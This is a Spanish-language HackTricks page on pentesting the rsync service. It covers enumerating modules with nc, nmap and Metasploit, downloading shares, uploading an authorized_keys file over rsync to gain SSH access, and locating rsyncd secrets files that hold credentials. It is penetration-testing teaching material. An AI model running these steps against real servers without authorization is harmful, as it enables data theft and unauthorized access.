# 873 - Pentesting Rsync

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? o Â¿quieres acceder a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **InformaciÃ³n BÃ¡sica**

> **rsync** es una utilidad para [transferir](https://en.wikipedia.org/wiki/File\_transfer) y [sincronizar](https://en.wikipedia.org/wiki/File\_synchronization) [archivos](https://en.wikipedia.org/wiki/Computer\_file) de manera eficiente entre una computadora y un disco duro externo y a travÃ©s de [computadoras en red](https://en.wikipedia.org/wiki/Computer\_network) comparando los [tiempos de modificaciÃ³n](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) y tamaÃ±os de los archivos.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) Se encuentra comÃºnmente en [sistemas operativos tipo Unix](https://en.wikipedia.org/wiki/Unix-like). El algoritmo de rsync es un tipo de [codificaciÃ³n delta](https://en.wikipedia.org/wiki/Delta\_encoding), y se utiliza para minimizar el uso de la red. [Zlib](https://en.wikipedia.org/wiki/Zlib) puede ser utilizado para compresiÃ³n de [datos](https://en.wikipedia.org/wiki/Data\_compression) adicional,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) y [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) o [stunnel](https://en.wikipedia.org/wiki/Stunnel) pueden ser utilizados para seguridad.

De [wikipedia](https://en.wikipedia.org/wiki/Rsync).

**Puerto predeterminado:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## EnumeraciÃ³n

### Banner y comunicaciÃ³n manual
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Enumerar carpetas compartidas**

**Un mÃ³dulo rsync es esencialmente una carpeta compartida**. Estos mÃ³dulos **pueden estar protegidos opcionalmente por una contraseÃ±a**. Esta opciÃ³n lista los mÃ³dulos disponibles y, opcionalmente, determina si el mÃ³dulo requiere una contraseÃ±a para acceder:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Tenga en cuenta que se podrÃ­a configurar un nombre compartido para que no aparezca en la lista. Por lo tanto, podrÃ­a haber algo **oculto**.
Tenga en cuenta que puede haber algunos **nombres compartidos** que se enumeran donde necesita algunas **credenciales** (diferentes) para acceder. Por lo tanto, no siempre todos los nombres listados van a ser accesibles y lo notarÃ¡ si recibe un mensaje de _**"Acceso Denegado"**_ al intentar acceder a algunos de estos.

### [**Fuerza bruta**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Rsync Manual

Una vez que tenga la **lista de mÃ³dulos**, tiene algunas opciones diferentes dependiendo de las acciones que quiera realizar y si se requiere autenticaciÃ³n o no. **Si no se requiere autenticaciÃ³n** puede **listar** una carpeta compartida:
```bash
rsync -av --list-only rsync://192.168.0.123/shared_name
```
Y **copie** todos los **archivos** a su mÃ¡quina local mediante el siguiente comando:
```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Esta **transfiere recursivamente todos los archivos del directorio** `<shared_name>` en la mÃ¡quina `<IP>` al directorio `./rsync_shared` en la mÃ¡quina local. Los archivos se transfieren en modo "archivo", lo que asegura que los enlaces simbÃ³licos, dispositivos, atributos, permisos, propiedades, etc. se conserven en la transferencia.

Si **tienes credenciales** puedes **listar/descargar** un **nombre compartido** usando (se pedirÃ¡ la contraseÃ±a):
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
TambiÃ©n podrÃ­as **subir** algÃºn **contenido** usando rsync (por ejemplo, en este caso podemos subir un archivo _**authorized\_keys**_ para obtener acceso a la caja):
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Encuentra el archivo de configuraciÃ³n de rsyncd:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Dentro del archivo de configuraciÃ³n a veces podrÃ­as encontrar el parÃ¡metro _secrets file = /ruta/al/archivo_ y este archivo podrÃ­a contener nombres de usuario y contraseÃ±as permitidos para autenticarse en rsyncd.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? o Â¿quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
